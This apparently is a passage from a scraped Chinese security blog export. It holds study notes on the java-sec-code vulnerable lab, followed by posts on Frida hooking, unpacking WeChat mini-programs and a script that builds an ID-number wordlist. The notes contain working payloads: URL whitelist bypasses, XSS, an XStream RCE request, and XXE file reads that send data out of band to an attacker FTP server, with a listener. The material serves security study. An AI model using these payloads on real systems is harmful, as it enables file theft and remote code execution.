针对JSONP，这里提一个比较有趣的问题。有的接口返回是JSON，非JSONP的格式，但是由于开发者写了一个callback参数（但是流量里并未出现）。所以在自动动扫描漏洞时，扫描器可加上callback、cback等参数，可能会有意想不到的收获。 比如：http://www.alitrip.com/order?id=1返回JSON格式，所以并不存在JSON劫持。但是访问http://www.alitrip.com/order?id=1&amp;callback=xxx可能就会返回JSONP格式，从而可能存在JSON劫持漏洞。 核心代码： @GetMapping(&quot;/vuln/endsWith&quot;) public String endsWith(@RequestParam(&quot;url&quot;) String url) { String host = SecurityUtil.gethost(url); for (String domain : domainwhitelist) { if (host.endsWith(domain)) { return &quot;Good url.&quot;; } } return &quot;Bad url.&quot;; } 访问 http://localhost:8080/java_sec_code_war/url/vuln/endsWith?url=http://aaajoychou.org 2.contains取出一级域名。判断一级域名在白名单列表里使用contains判断 Bypass POC： joychou.com.bypass.combypassjoychou.com 核心代码： @GetMapping(&quot;/vuln/contains&quot;)public String contains(@RequestParam(&quot;url&quot;) String url) { String host = SecurityUtil.gethost(url); for (String domain : domainwhitelist) { if (host.contains(domain)) { return &quot;Good url.&quot;; } } return &quot;Bad url.&quot;;} 访问 http://localhost:8080/java_sec_code_war/url/vuln/contains?url=http://joychou.org.bypass.com 3.statsWith取出一级域名，判断一级域名在白名单列表里使用startsWith判断 Bypass Poc: joychou.combypass 这种域名后缀虽然不存在，造成无法利用。但是在实际的测试中，确实发现某大公司是以这样的方式写的代码。所以说，如果没有规范，什么样的逻辑代码都能写出来。 4.正则表达式用正则表达式去匹配URL中是否存在www.joychou.com字符串Bypass Poc: www.joychou.com.bypass.com 还有的URL接口验证是否是图片链接，但是验证的方式居然是用正则匹配是否以类似.800*600.结尾。 Bypass Poc: www.joychou.com/_4528x2020.php 用正则判断host是否是域名 Bypass Poc: 10.10.10.10.xip.io 案例：腾讯某域名诊断功能存在SSRF（目前该漏洞已经修复）。该功能验证逻辑，首先判断host是否是域名。 所以我们可以利用xip.io进行Bypass。 核心代码： @GetMapping(&quot;/vuln/regex&quot;)public String regex(@RequestParam(&quot;url&quot;) String url) { String host = SecurityUtil.gethost(url); Pattern p = Pattern.compile(&quot;joychouorg&quot;); Matcher m = p.matcher(host); if (m.find()) { return &quot;Good url.&quot;; } else { return &quot;Bad url.&quot;; }} 访问： 5.正则匹配URL是否以.joychou.com正则为.*\\\\.joychou.com$的情况，之前的这两种xxx.xxxjoychou.com和xxx.joychou.com.xxx都不能绕过了。 Bypass Poc： www.baidu.com/?xxx.joychou.com 4.安全代码和测试环境安全代码逻辑很简单： 取一级域名 判断一级域名是否在白名单里。 方法调用： String[] urlwhitelist = {&quot;joychou.com&quot;, &quot;joychou.me&quot;};if (!UrlSecCheck(url, urlwhitelist)) { return;} 方法代码： 需要先添加guava库（目的是获取一级域名） &lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;21.0&lt;/version&gt;&lt;/dependency&gt;public static Boolean UrlSecCheck(String url, String[] urlwhitelist) { try { URL u = new URL(url); // 只允许http和https的协议 if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) { return false; } // 获取域名，并转为小写 String host = u.getHost().toLowerCase(); // 获取一级域名 String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString(); for (String whiteurl: urlwhitelist){ if (rootDomain.equals(whiteurl)) { return true; } } return false; } catch (Exception e) { return false; }} 核心代码： @GetMapping(&quot;/sec&quot;)public String sec(@RequestParam(&quot;url&quot;) String url) { String whiteDomainlists[] = {&quot;joychou.org&quot;, &quot;joychou.com&quot;, &quot;test.joychou.me&quot;}; if (!SecurityUtil.isHttp(url)) { return &quot;SecurityUtil is not http or https&quot;; } String host = SecurityUtil.gethost(url); for (String whiteHost: whiteDomainlists){ if (whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.endsWith(whiteHost)) { return url; } else if (!whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.equals(whiteHost)) { return url; } } return &quot;Bad url.&quot;;}@GetMapping(&quot;/sec/array_indexOf&quot;)public String sec_array_indexOf(@RequestParam(&quot;url&quot;) String url) { // Define muti-level host whitelist. ArrayList&lt;String&gt; whiteDomainlists = new ArrayList&lt;&gt;(); whiteDomainlists.add(&quot;bbb.joychou.org&quot;); whiteDomainlists.add(&quot;ccc.bbb.joychou.org&quot;); if (!SecurityUtil.isHttp(url)) { return &quot;SecurityUtil is not http or https&quot;; } String host = SecurityUtil.gethost(url); if (whiteDomainlists.indexOf(host) != -1) { return &quot;Good url.&quot;; } return &quot;Bad url.&quot;;} 5.CORS绕过先来看看Access-Control-Allow-Origin的使用。一般有两种方式设置该值： 后端代码设置 Nginx等Web服务器设置 域名设置test.joychou.org如下，表示该域名只接受来自http://blacktech.com的请求。 add_header Access-Control-Allow-Origin 'http://blacktech.com'; 本地写一份请求test.joychou.org的代码，保存为1.html &lt;html&gt;test&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; $.ajax({ type: 'GET', url: 'http://test.joychou.org', success: function (data) { alert(data); console.log('Yeah! Load Success.'); }, error: function (error) { alert('Oh,no! Load Failed.'); } });&lt;/script&gt;&lt;/html&gt; 请求http://localhost/1.html报错如下： Failed to load http://test.joychou.org/: The 'Access-Control-Allow-Origin' header has a value 'http://blacktech.com' that is not equal to the supplied origin. Origin 'http://localhost' is therefore not allowed access. 改下/etc/hosts，把 localhost 改成 blacktech.com，请求http://blacktech.com/1.html就不会报错了，而且能获取到http://test.joychou.org 的返回内容It works. 我们来看看origin，这个值和Referer一样，前端不能设置，如果http://baidu.com对http://test.joychou.org发起一个跨域请求，那么origin的值就为http://baidu.com。 那么问题来了，如果Access-Control-Allow-Origin设置的域名能被绕过，那么用请求header里的origin绕即可。绕过后，就能获取接口的数据，和JSONP一样。 18.XSSXSS作者提供了两种利用场景 核心代码： @RequestMapping(&quot;/reflect&quot;)@ResponseBodypublic static String reflect(String xss) { return xss;} 访问： http://localhost:8080/java_sec_code_war/xss/reflect?xss=%3Cscript%3Ealert(1)%3C/script%3E 这里还展示一种将XSS语句带入cookie，然后在其他处调出造成XSS的可能性 @RequestMapping(&quot;/stored/store&quot;)@ResponseBodypublic String store(String xss, HttpServletResponse response) { Cookie cookie = new Cookie(&quot;xss&quot;, xss); response.addCookie(cookie); return &quot;Set param into cookie&quot;;}@RequestMapping(&quot;/stored/show&quot;)@ResponseBodypublic String show(@CookieValue(&quot;xss&quot;) String xss) { return xss;} 依次访问： http://localhost:8080/java_sec_code_war/xss/stored/store?xss=%3Cscript%3Ealert(1)%3C/script%3Ehttp://localhost:8080/java_sec_code_war/xss/stored/show 修复代码： @RequestMapping(&quot;/safe&quot;)@ResponseBodypublic static String safe(String xss) { return encode(xss);}private static String encode(String origin) { origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;&quot;); origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&lt;&quot;); origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&gt;&quot;); origin = StringUtils.replace(origin, &quot;\\&quot;&quot;, &quot;&quot;&quot;); origin = StringUtils.replace(origin, &quot;'&quot;, &quot;&amp;#x27;&quot;); origin = StringUtils.replace(origin, &quot;/&quot;, &quot;/&quot;); return origin;} 将特殊字符进行转译 19.XStreamRCE XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。 Xstream具有以下优点 使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。 无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。 性能 - XStream快速和低内存占用，适合于大对象图或系统。 干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。 不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。 完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。 可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。 安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。 错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。 另一种输出格式 - XStream支持其它的输出格式，如JSON。 核心代码： @PostMapping(&quot;/xstream&quot;) public String parseXml(HttpServletRequest request) throws Exception { String xml = WebUtils.getRequestBody(request); XStream xstream = new XStream(new DomDriver()); xstream.fromXML(xml); return &quot;xstream&quot;; } public static void main(String[] args) { User user = new User(); user.setId(0); user.setUsername(&quot;admin&quot;); XStream xstream = new XStream(new DomDriver()); String xml = xstream.toXML(user); // Serialize System.out.println(xml); user = (User) xstream.fromXML(xml); // Deserialize System.out.println(user.getId() + &quot;: &quot; + user.getUsername()); }} 构造请求包如下 POST /java_sec_code_war/xstream HTTP/1.1Host: test.ol4three.com:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: JSESSIONID=7BBEAB4E7FC8E7B10575631B0CA5413C; XSRF-TOKEN=820fd620-2c78-424b-a852-93ca40553975; remember-me=YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; __gads=ID=f3f270f7ceb2e609-2233066a20c4001e:T=1602735684:RT=1602735684:S=ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73AConnection: closeContent-Type: application/xmlContent-Length: 445&lt;sorted-set&gt; &lt;string&gt;foo&lt;/string&gt; &lt;dynamic-proxy&gt; &lt;!-- --&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=&quot;java.beans.EventHandler&quot;&gt; &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;/System/Applications/Calculator.app&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; CVE-2020-26217 | XStream远程代码执行漏洞 通过XStream对象反序列化的RCE Xstream 反序列化远程代码执行漏洞深入分析 20.XXEXXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。 核心代码： @RequestMapping(value = &quot;/DocumentBuilder/vuln01&quot;, method = RequestMethod.POST)public String DocumentBuilderVuln01(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml // 遍历xml节点name和value StringBuilder buf = new StringBuilder(); NodeList rootNodeList = document.getChildNodes(); for (int i = 0; i &lt; rootNodeList.getLength(); i++) { Node rootNode = rootNodeList.item(i); NodeList child = rootNode.getChildNodes(); for (int j = 0; j &lt; child.getLength(); j++) { Node node = child.item(j); buf.append(String.format(&quot;%s: %s\\n&quot;, node.getNodeName(), node.getTextContent())); } } sr.close(); return buf.toString(); } catch (Exception e) { logger.error(e.toString()); return EXCEPT; }} 有回显的利用方式 输入对应的payload： POST /java_sec_code_war/xxe/DocumentBuilder/vuln01 HTTP/1.1Host: test.ol4three.com:8080Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: remember-me=YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN=3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID=598DC30E191F87CCFD005A39436FD289; __gads=ID=f3f270f7ceb2e609-2233066a20c4001e:T=1602735684:RT=1602735684:S=ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73AConnection: closeContent-Type: application/xmlContent-Length: 167&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;book id=&quot;1&quot;&gt; &lt;name&gt;Good Job&lt;/name&gt; &lt;author&gt;ol4three&lt;/author&gt; &lt;year&gt;2021&lt;/year&gt; &lt;price&gt;100.00&lt;/price&gt; &lt;/book&gt; 利用file协议读取文件： POST /java_sec_code_war/xxe/DocumentBuilder/vuln01 HTTP/1.1Host: test.ol4three.com:8080Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: remember-me=YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN=3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID=598DC30E191F87CCFD005A39436FD289; __gads=ID=f3f270f7ceb2e609-2233066a20c4001e:T=1602735684:RT=1602735684:S=ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73AConnection: closeContent-Type: application/xmlContent-Length: 131&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE joychou [ &lt;!ENTITY xxe SYSTEM &quot;file:///tmp/111.txt&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt; 在 XML 元素中，”&lt;” 和 “&amp;” 是非法的。”&lt;” 会产生错误，因为解析器会把该字符解释为新元素的开始。”&amp;” 也会产生错误，因为解析器会把该字符解释为字符实体的开始。 ╰─$ cat 111.txtol4three1111~!@#%^%'&quot;&gt;2222&lt;%&amp; ![image-20211027164104470](../../../../../../../Library/Application Support/typora-user-images/image-20211027164104470.png) CDATA CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。 CDATA 部分由&quot;&lt;![CDATA[&quot;开始，由&quot;]]&gt;&quot;结束 简单一点的来说，将脚本代码定义为CDATA后，CDATA部分中的内容就会被解析器忽略，这个时候就可以读取文件了。 1.有回显本地主机：CDATA Payload &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///tmp/1.txt&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://test.ol4three.com:800/evil.dtd&quot;&gt; %dtd;]&gt;&lt;roottag&gt;&amp;all;&lt;/roottag&gt; 本地主机：evil.dtd &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; 但我在测试用CDATA，并没有读取&lt;&amp;成功 2.Bind 无回显payloads： 没有ENTITY关键字，可以用来Bypass WAF &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://test.joychou.org/evil.dtd&quot;&gt; 有ENTITY关键字，可能会被WAF拦截 &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://test.joychou.org/evil.dtd&quot;&gt;%remote;]&gt;&lt;root/&gt; evil.dtd代码： &lt;!ENTITY % payload SYSTEM &quot;file:///etc/redhat-release&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://fakeuser:fakepass@test.joychou.org:2121/%payload;'&gt;&quot;&gt;%int;%trick; 或者将%payload;放在ftp的username或者password处。如果ftp不跟用户名或者密码ftp://test.joychou.org:2121/%payload;，利用FTP协议会接收到Java的版本。 New client connected&lt; USER anonymous&lt; PASS Java1.8.0_121@&lt; TYPE I&lt; EPSV ALL&lt; EPSV&lt; EPRT |1|172.17.29.150|60731|&lt; RETR test&lt; xxe&lt; ftp FTP Server代码： require 'socket'server = TCPServer.new 2121loop do Thread.start(server.accept) do |client| puts &quot;New client connected&quot; data = &quot;&quot; client.puts(&quot;220 xxe-ftp-server&quot;) loop { req = client.gets() puts &quot;&lt; &quot;+req if req.include? &quot;USER&quot; client.puts(&quot;331 password please - version check&quot;) else #puts &quot;&gt; 230 more data please!&quot; client.puts(&quot;230 more data please!&quot;) end } endend 测试的结果(Centos)： Java版本 是否能读换行 被截断的字符 其他报错的字符(什么都不能读) 被替换成换行的字符 1.7.0_80 是 # ? % &amp; ‘ / 1.8.0_121 是 # ? % &amp; ‘ / 1.8.0_181 否 # ? % &amp; ‘ / 可能还有其他的字符和其他的Java版本没有测试。不过我猜测，自从Java 1.8的某个版本起，就不能读取换行。至于是那个版本开始，就不具体测试了，大家知道这个特性就好 -) 也可以把FTP换成HTTP协议，更加直观 3.支持的Xinclude的XXEPOC &lt;?xml version=&quot;1.0&quot; ?&gt;&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;&lt;/root&gt; 详情可以查看浅析xml之xinclude &amp; xslt 各平台支持协议如下：我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。 所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议： JAVA常见的XXE漏洞写法和防御 Java-XXE-总结 Java_XXE_漏洞 0x03 参考https://github-wiki-see.page/m/JoyChou93/java-sec-code/wiki/ https://shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#CRLF%E6%B3%A8%E5%85%A5","link":"/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"title":"Frida--Android逆向之动态加载dex Hook(下)","text":"​ 上篇主要是跟着师傅学习了Robust的原理，并以做题的思路去求解了这个示例ctf，其实这是一种思路的启示，当我们在不知道怎么hook动态加载的dex，jar时候，找找是否存在能够操作动态加载出来的类的方法。 ​ 这一篇我们一起来学习如何用Frida来hook DexclassLoader，如何用反射直接调用类的方法，达到跟hook一般类一样的效果。 文章涉及内容以及使用到的工具0x00 使用到的工具1234567ADT（Android Developer Tools）Jadx-guiJEBfridaapktoolandroid源码包天天模拟器（genymotion，实体机等亦可） 0x01 涉及知识点12345678Java 泛型Java 反射机制DexClassLoader 动态加载机制Frida 基本操作Frida 创建任意类型数组（Java.array）Frida 类型转换（Java.cast）Frida 方法重载（overload）Frida Spawn 代码分析与构造0x00 Frida Spawn的使用​ 通过上篇Robust的原理学习和对app的分析，我们知道Robust的其实就是在正常的使用DexClassLoader去动态加载文件，随后通过反射的方式去调用类方法或成员变量。 ​ 同时在上篇文章中，我们也知道Robust调用DexClassLoader的类是在PatchExecutor中，而调用PatchExecutor类是在一个叫runRobust的方法中，这个方法就在MainActivity中，并且在onCreate方法中调用。 现在我们明白了一点是，app动态加载dex的地方是在onCreate中，也就是说app一启动就执行了动态加载，并不是在我们点击按钮的时候。所以这个地方，我们要执行py脚本的话，需要在app执行onCreate方法之前。frida有一个功能可以为我们生成一个进程而不是将它注入到运行中的进程中，它注入到Zygote中，生成我们的进程并且等待输入。 我们可以通过-f参数选项来实现。 1frida -U -f app完整名","link":"/2021/08/13/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8B/"},{"title":"微信小程序反编译","text":"环境准备Mac os 11.2.2网易MUMU模拟器APP文件管理器微信开发者工具:Stable Build (1.05.2108130) 获取小程序包1.使用自己手机上的微信打开对应的小程序,可以添加到&quot;我的小程序&quot;2.打开模拟器的微信并登录3.在模拟器微信的下拉小程序最近使用历史中打开&quot;你所选的小程序&quot;,如果历史记录中没有就在我的小程序中找一找4.打开小程序等待加载之后就可以去找源码包了5.打开对应的文件管理器,进入到以下路径查找源码包(可以根据下载时间区分出你想要的源码包)6.拷贝到mumu浏览器共享目录 小程序存放路径如下：/data/data/com.tencent.mm/MicroMsg/…/appbrand/pkg/ …部分根据时间戳或者单点击一个小程序在进行测试，大部分为03075c115f972899a1b1b8cc70506599这种 反编译小程序地址：https://github.com/xuedingmiaojun/wxappUnpacker 下载后在目录下安装如下依赖： npm install esprima npm install css-tree npm install cssbeautify npm install vm2 npm install uglify-es npm install js-beautify 使用命令node wuWxapkg.js path_wxapkg进行反编译输出信息如下 ╰─$ node wuWxapkg.js _1900266061_26.wxapkgUnpack file _1900266061_26.wxapkg...Header info: firstMark: 0xbe unknownInfo: 0 infoListLength: 1305 dataLength: 291959 lastMark: 0xedFile list info: fileCount: 38Saving files...Unpack done.Split app-service.js and make up configs &amp; wxss &amp; wxml &amp; wxs...deal config okdeal js okdeal html okdeal css okDecompile ./Componet/circle/circle.wxml...Decompile success!Decompile ./Componet/wave/wave.wxml...Decompile success!Decompile ./Componet/wx-pulltorefresh-view/wx-pulltorefresh-view.wxml...Decompile success!Decompile ./pages/date/date.wxml...Decompile success!Decompile ./pages/exam/exam.wxml...Decompile success!Decompile ./pages/freeclass/freeclass.wxml...Decompile success!Decompile ./pages/grade/grade.wxml...Decompile success!Decompile ./pages/index/index.wxml...Decompile success!Decompile ./pages/index/passwd/passwd.wxml...Decompile success!Decompile ./pages/jxpg/each.wxml...Decompile success!Decompile ./pages/jxpg/jxpg.wxml...Decompile success!Decompile ./pages/level/level.wxml...Decompile success!Decompile ./pages/timetable/my-modal/my-modal.wxml...Decompile success!Decompile ./pages/timetable/timetable.wxml...Decompile success!splitJs: /Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26/app-service.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 utils/httputils.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 utils/util.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 app.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 Componet/circle/circle.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 Componet/wave/wave.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 Componet/wx-pulltorefresh-view/wx-pulltorefresh-view.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/index/passwd/passwd.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/timetable/my-modal/my-modal.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/index/index.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/grade/grade.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/level/level.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/timetable/timetable.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/freeclass/freeclass.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/date/date.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/exam/exam.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/jxpg/jxpg.js/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26 pages/jxpg/each.jsSplitting &quot;/Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26/app-service.js&quot; done.Guess wxss(first turn)...Import count info: {}Guess wxss(first turn) done.Generate wxss(second turn)...Generate wxss(second turn) done.Save wxss...saveDir: /Users/oldthree/Downloads/wxappUnpacker-master/_1900266061_26Split and make up done.Delete files...Deleted.File done.Total use: 643.682ms 工具用法 node wuConfig.js &lt;files...&gt; 将 app-config.json 中的内容拆分到各个文件对应的 .json 和 app.json , 并通过搜索 app-config.json 所在文件夹下的所有文件尝试将 iconData 还原为 iconPath 。 node wuJs.js &lt;files...&gt; 将 app-service.js (或小游戏中的 game.js ) 拆分成一系列原先独立的 javascript 文件，并使用 Uglify-ES 美化，从而尽可能还原编译前的情况。 node wuWxml.js [-m] &lt;files...&gt; 将编译/混合到 page-frame.html ( 或 app-wxss.js ) 中的 wxml 和 wxs 文件还原为独立的、未编译的文件。如果加上-m指令，就会阻止block块自动省略，可能帮助解决一些相关过程的 bug 。 node wuWxss.js &lt;dirs...&gt; 通过获取文件夹下的 page-frame.html ( 或 app-wxss.js ) 和其他 html 文件的内容，还原出编译前 wxss 文件的内容。 node wuWxapkg.js [-o] [-d] [-s=&lt;Main Dir&gt;] &lt;files...&gt; 将 wxapkg 文件解包，并将包中上述命令中所提的被编译/混合的文件自动地恢复原状。如果加上-o指令，表示仅解包，不做后续操作。如果加上-d指令，就会保留编译/混合后所生成的新文件，否则会自动删去这些文件。同时，前面命令中的指令也可直接加在这一命令上。 ps：如果想单独执行config、js、wxml、wxss的反编译可以在解包时加-o参数不做后续操作 导入开发者工具或者打开编辑器进行查看打开微信开发者工具,导入项目即可，对应id申请测试就可以 注意勾选不校验合法域名 勾掉e6转es5(这个小程序貌似并没有使用es6语法) 解包其它小程序可能项目配置略有不同。 图形化操作下载https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端 根据自己的版本进行下载安装 打开后直接上传对应的wxapkg文件即可 可以查看安全日志，并导出压缩包 参考链接https://github.com/xuedingmiaojun/wxappUnpacker https://github.com/wetools/wept https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端 http://xuedingmiao.com/blog/xcx_unpack.html","link":"/2021/09/13/WEB/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/"},{"title":"常用Dict使用集合","text":"身份证后六位： import itertoolsif __name__ == '__main__': date = input(&quot;出生日期: &quot;) sex = '02468' if int(input(&quot;性别(男1女2): &quot;)) % 2 == 0 else '13579' # 性别位 check = '0123456789X' # 校验位 other = '0123456789' # 其它位 nums = itertools.product(other, other, sex, check) cards = [] for num in nums: card = date + &quot;&quot;.join(num) cards.append(card) print(len(cards)) print(cards)","link":"/2021/09/26/WEB/%E5%B8%B8%E7%94%A8Dict%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/"}],"tags":[{"name":"IOT","slug":"IOT","link":"/tags/IOT/"},{"name":"BadUsb","slug":"BadUsb","link":"/tags/BadUsb/"},{"name":"PowerSploit","slug":"PowerSploit","link":"/tags/PowerSploit/"},{"name":"BLE","slug":"BLE","link":"/tags/BLE/"},{"name":"Ubertooth one","slug":"Ubertooth-one","link":"/tags/Ubertooth-one/"},{"name":"SDK","slug":"SDK","link":"/tags/SDK/"},{"name":"iot","slug":"iot","link":"/tags/iot/"},{"name":"路由器","slug":"路由器","link":"/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"默认密码","slug":"默认密码","link":"/tags/%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/"},{"name":"crunch","slug":"crunch","link":"/tags/crunch/"},{"name":"Sql注入","slug":"Sql注入","link":"/tags/Sql%E6%B3%A8%E5%85%A5/"},{"name":"Mybatis","slug":"Mybatis","link":"/tags/Mybatis/"},{"name":"PHP网站","slug":"PHP网站","link":"/tags/PHP%E7%BD%91%E7%AB%99/"},{"name":"Drozer","slug":"Drozer","link":"/tags/Drozer/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"AWD","slug":"AWD","link":"/tags/AWD/"},{"name":"MSF","slug":"MSF","link":"/tags/MSF/"},{"name":"后渗透","slug":"后渗透","link":"/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"内网渗透","slug":"内网渗透","link":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"NC","slug":"NC","link":"/tags/NC/"},{"name":"代理转发","slug":"代理转发","link":"/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"},{"name":"红队百科全书","slug":"红队百科全书","link":"/tags/%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"},{"name":"Mysql-python","slug":"Mysql-python","link":"/tags/Mysql-python/"},{"name":"scrcpy","slug":"scrcpy","link":"/tags/scrcpy